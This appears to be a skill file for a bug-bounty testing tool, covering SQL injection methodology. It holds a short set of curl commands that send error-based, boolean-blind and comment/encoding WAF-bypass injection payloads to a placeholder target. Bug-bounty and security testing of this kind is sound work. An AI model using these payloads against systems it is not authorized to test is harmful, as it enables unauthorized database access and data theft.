---
name: attack-sqli
description: "SQL injection — error-based, blind, and WAF-evading payloads for MySQL/MSSQL/Oracle"
category: "input-validation"
version: "1.0"
author: "bountyreper-official"
tags:
  - sqli
  - injection
  - mysql
tech_stack:
  - web
  - mysql
cwe_ids:
  - CWE-89
chains_with:
  - wstg-injection
prerequisites: []
---

# SQL Injection

## Objective

Exploit SQL injection via error, blind, and WAF bypass techniques.

> **Attribution:** Methodology from [KathanP19/HowToHunt — SQLi](https://github.com/KathanP19/HowToHunt/tree/master/SQLi) (171 lines). Licensed GPL-3.0.

## Testing Methodology

```bash
# Basic test
curl "https://target.com/item?id=1'" | grep -i "sql\|syntax"
curl "https://target.com/item?id=1 and 1=1" # true
curl "https://target.com/item?id=1 and 1=2" # false (blind)

# WAF bypass (from WAF_Bypasses supplement)
curl "https://target.com/item?id=1/**/and/**/1=1"
curl "https://target.com/item?id=1%20and%201=1"
```

## References

- [HowToHunt — SQLi](https://github.com/KathanP19/HowToHunt/tree/master/SQLi)
